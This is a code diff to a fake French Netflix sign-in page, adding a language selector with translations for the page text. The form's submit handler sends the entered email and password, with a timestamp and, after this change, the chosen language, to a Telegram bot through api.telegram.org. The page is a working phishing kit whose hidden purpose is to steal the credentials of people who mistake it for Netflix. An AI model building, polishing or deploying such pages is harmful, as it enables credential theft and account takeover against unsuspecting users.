@@ -34,10 +34,22 @@
             padding: 20px 45px;
             position: relative;
             z-index: 10;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
         .header img {
             height: 45px;
+        }
+
+        .language-selector {
+            background: rgba(0,0,0,0.4);
+            color: white;
+            padding: 8px 15px;
+            border: 1px solid #aaa;
+            border-radius: 4px;
+            font-size: 14px;
         }
 
         .login-container {
@@ -114,9 +126,21 @@
         .remember-help {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 50px;
+            align-items: center;
+            margin-bottom: 10px;
             color: #b3b3b3;
             font-size: 13px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+        }
+
+        .remember-me input {
+            width: auto;
+            height: auto;
+            margin-right: 5px;
         }
 
         .remember-help a {
@@ -175,20 +199,6 @@
             font-size: 13px;
         }
 
-        .language-selector {
-            display: inline-block;
-            border: 1px solid #737373;
-            padding: 8px 10px;
-            margin-bottom: 20px;
-        }
-
-        select {
-            background: transparent;
-            color: #737373;
-            border: none;
-            font-size: 13px;
-        }
-
         /* Spinner styles */
         .spinner {
             display: none;
@@ -234,65 +244,166 @@
             .header img {
                 height: 32px;
             }
+            
+            .footer-links {
+                grid-template-columns: repeat(2, 1fr);
+            }
         }
     </style>
 </head>
 <body>
     <header class="header">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
+        <select class="language-selector" id="languageSelector">
+            <option value="fr">Français</option>
+            <option value="en">English</option>
+            <option value="es">Español</option>
+            <option value="de">Deutsch</option>
+        </select>
     </header>
 
     <div class="login-container">
-        <h1>S'identifier</h1>
+        <h1 id="loginTitle">S'identifier</h1>
         <form id="loginForm">
             <div class="input-group">
                 <input type="email" id="email" name="email" placeholder=" " required>
-                <label for="email">E-mail ou numéro de téléphone</label>
+                <label for="email" id="emailLabel">E-mail ou numéro de téléphone</label>
             </div>
             <div class="input-group">
                 <input type="password" id="password" name="password" placeholder=" " required>
-                <label for="password">Mot de passe</label>
+                <label for="password" id="passwordLabel">Mot de passe</label>
             </div>
             <button type="submit" id="submitBtn">
-                <span>S'identifier</span>
+                <span id="loginButtonText">S'identifier</span>
                 <div class="spinner"></div>
             </button>
             <div class="remember-help">
-                <div>
+                <div class="remember-me">
                     <input type="checkbox" id="remember">
-                    <label for="remember">Se souvenir de moi</label>
+                    <label for="remember" id="rememberLabel">Se souvenir de moi</label>
                 </div>
-                <a href="#">Besoin d'aide ?</a>
+                <a href="#" id="helpLink">Besoin d'aide ?</a>
             </div>
         </form>
         <div class="signup-now">
-            Nouveau sur Netflix ? <a href="#">Inscrivez-vous maintenant.</a>
+            <span id="newUserText">Nouveau sur Netflix ?</span> <a href="#" id="signupLink">Inscrivez-vous maintenant.</a>
         </div>
     </div>
 
     <footer class="footer">
         <div class="footer-top">
-            Des questions ? Appelez le <a href="tel:(+33) 0805-543-063">(+33) 0805-543-063</a>
+            <span id="questionsText">Des questions ? Appelez le</span> <a href="tel:(+33) 0805-543-063">(+33) 0805-543-063</a>
         </div>
         <div class="footer-links">
-            <a href="#">FAQ</a>
-            <a href="#">Centre d'aide</a>
-            <a href="#">Conditions d'utilisation</a>
-            <a href="#">Confidentialité</a>
-            <a href="#">Préférences de cookies</a>
-            <a href="#">Mentions légales</a>
-            <a href="#">Choix liés à la pub</a>
-        </div>
-        <div class="language-selector">
-            <select>
-                <option>Français</option>
-                <option>English</option>
-            </select>
+            <a href="#" id="faqLink">FAQ</a>
+            <a href="#" id="helpCenterLink">Centre d'aide</a>
+            <a href="#" id="termsLink">Conditions d'utilisation</a>
+            <a href="#" id="privacyLink">Confidentialité</a>
+            <a href="#" id="cookiesLink">Préférences de cookies</a>
+            <a href="#" id="legalLink">Mentions légales</a>
+            <a href="#" id="adsLink">Choix liés à la pub</a>
         </div>
         <div>Netflix France</div>
     </footer>
 
     <script>
+        // Traductions multilingues
+        const translations = {
+            fr: {
+                loginTitle: "S'identifier",
+                emailLabel: "E-mail ou numéro de téléphone",
+                passwordLabel: "Mot de passe",
+                loginButtonText: "S'identifier",
+                rememberLabel: "Se souvenir de moi",
+                helpLink: "Besoin d'aide ?",
+                newUserText: "Nouveau sur Netflix ?",
+                signupLink: "Inscrivez-vous maintenant.",
+                questionsText: "Des questions ? Appelez le",
+                faqLink: "FAQ",
+                helpCenterLink: "Centre d'aide",
+                termsLink: "Conditions d'utilisation",
+                privacyLink: "Confidentialité",
+                cookiesLink: "Préférences de cookies",
+                legalLink: "Mentions légales",
+                adsLink: "Choix liés à la pub"
+            },
+            en: {
+                loginTitle: "Sign In",
+                emailLabel: "Email or phone number",
+                passwordLabel: "Password",
+                loginButtonText: "Sign In",
+                rememberLabel: "Remember me",
+                helpLink: "Need help?",
+                newUserText: "New to Netflix?",
+                signupLink: "Sign up now.",
+                questionsText: "Questions? Call",
+                faqLink: "FAQ",
+                helpCenterLink: "Help Center",
+                termsLink: "Terms of Use",
+                privacyLink: "Privacy",
+                cookiesLink: "Cookie Preferences",
+                legalLink: "Legal Notices",
+                adsLink: "Ad Choices"
+            },
+            es: {
+                loginTitle: "Iniciar sesión",
+                emailLabel: "Correo electrónico o número de teléfono",
+                passwordLabel: "Contraseña",
+                loginButtonText: "Iniciar sesión",
+                rememberLabel: "Recuérdame",
+                helpLink: "¿Necesitas ayuda?",
+                newUserText: "¿Nuevo en Netflix?",
+                signupLink: "Suscríbete ahora.",
+                questionsText: "¿Preguntas? Llama al",
+                faqLink: "Preguntas frecuentes",
+                helpCenterLink: "Centro de ayuda",
+                termsLink: "Términos de uso",
+                privacyLink: "Privacidad",
+                cookiesLink: "Preferencias de cookies",
+                legalLink: "Avisos legales",
+                adsLink: "Opciones de anuncios"
+            },
+            de: {
+                loginTitle: "Anmelden",
+                emailLabel: "E-Mail oder Telefonnummer",
+                passwordLabel: "Passwort",
+                loginButtonText: "Anmelden",
+                rememberLabel: "Angemeldet bleiben",
+                helpLink: "Hilfe benötigt?",
+                newUserText: "Neu bei Netflix?",
+                signupLink: "Jetzt anmelden.",
+                questionsText: "Fragen? Ruf an",
+                faqLink: "FAQ",
+                helpCenterLink: "Hilfe-Center",
+                termsLink: "Nutzungsbedingungen",
+                privacyLink: "Datenschutz",
+                cookiesLink: "Cookie-Einstellungen",
+                legalLink: "Rechtliche Hinweise",
+                adsLink: "Werbepräferenzen"
+            }
+        };
+
+        // Gestion du changement de langue
+        document.getElementById('languageSelector').addEventListener('change', function() {
+            const lang = this.value;
+            updateLanguage(lang);
+        });
+
+        function updateLanguage(lang) {
+            const trans = translations[lang];
+            for (const [key, value] of Object.entries(trans)) {
+                const element = document.getElementById(key);
+                if (element) {
+                    if (element.tagName === 'LABEL' || element.tagName === 'SPAN' || element.tagName === 'A') {
+                        element.textContent = value;
+                    } else {
+                        element.innerHTML = value;
+                    }
+                }
+            }
+        }
+
+        // Gestion du formulaire
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -313,7 +424,7 @@
 
 ⏰ ${new Date().toLocaleString()}
 
-🌐 Adresse IP: ${window.location.hostname}`;
+🌐 Langue: ${document.getElementById('languageSelector').value.toUpperCase()}`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
